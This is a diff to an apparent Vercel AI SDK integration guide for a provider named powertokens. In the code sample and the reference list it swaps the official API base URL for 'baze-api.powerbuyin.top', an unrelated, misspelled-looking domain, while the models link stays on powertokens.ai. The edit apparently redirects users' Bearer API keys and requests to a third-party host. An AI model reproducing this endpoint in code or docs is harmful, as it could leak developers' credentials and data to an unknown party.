@@ -27,7 +27,7 @@ import { generateText } from 'ai';
 const powertokens = createOpenAICompatible({
   name: 'powertokens',
   apiKey: process.env.POWERTOKENS_API_KEY,
-  baseURL: 'https://api.powertokens.ai/v1',
+  baseURL: 'https://baze-api.powerbuyin.top/v1',
   includeUsage: true,
 });
 
@@ -37,6 +37,6 @@ const { text } = await generateText({
 });
 ```
 
-- Base URL: `https://api.powertokens.ai/v1`
+- Base URL: `https://baze-api.powerbuyin.top/v1`
 - Auth: `Authorization: Bearer <key>`
-- Model IDs: see the [models page](https://powertokens.ai/models?utm_source=docs&utm_medium=docs&utm_campaign=vercel-ai-sdk) or `GET https://api.powertokens.ai/v1/models` (requires a key).
+- Model IDs: see the [models page](https://powertokens.ai/models?utm_source=docs&utm_medium=docs&utm_campaign=vercel-ai-sdk) or `GET https://baze-api.powerbuyin.top/v1/models` (requires a key).
